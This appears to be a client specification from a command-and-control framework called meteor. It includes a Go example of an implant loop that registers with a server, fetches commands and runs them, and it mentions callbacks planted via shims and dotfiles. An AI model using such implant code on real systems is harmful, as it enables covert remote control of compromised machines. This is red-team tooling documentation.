# Client Spec

 - All client actions (registration, payload generation, execution, etc) are handled by the [metcli](https://github.com/degenerat3/metcli) package EXCEPT for the `send` function. This is the only thing that must be implemented by a user (as is the case for servers).

 - It is suggested that each client has a defined callback interval/delta, but in cases where that is not implemented (ex: callbacks from shims, dotfiles, etc), those values are still required by the registration endpoint and the value of '0' should be used.

 ### Example Client Main Code  
 As you can see in the example below, all payload generation and command handling is done by the `metcli` package. The only function implemented by the user is the `send(p, m)` function, where `p` is a string to send, and `m` is the `Metclient` object created by `metcli.GenClient`.  

 The `send` function must be able to take the string argument, send it over the implemented channel, then return the decoded string response. The `metcli.DecodePayload` function is exported in order to make the latter more simple. For the full example code of a client, look at `meteor/clients/petrie/petrie.go`.  

 ```golang
func main() {
	m := metcli.GenClient(SERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)
	p := metcli.PreCheck(m)
	if p != "registered" {
		send(p, m)
	}
	comPL := metcli.GenGetComPL(m)
	comstr := send(comPL, m)
	res := metcli.HandleComs(comstr, m)
	if len(res) > 0 {
		send(res, m)
	}
}
 ```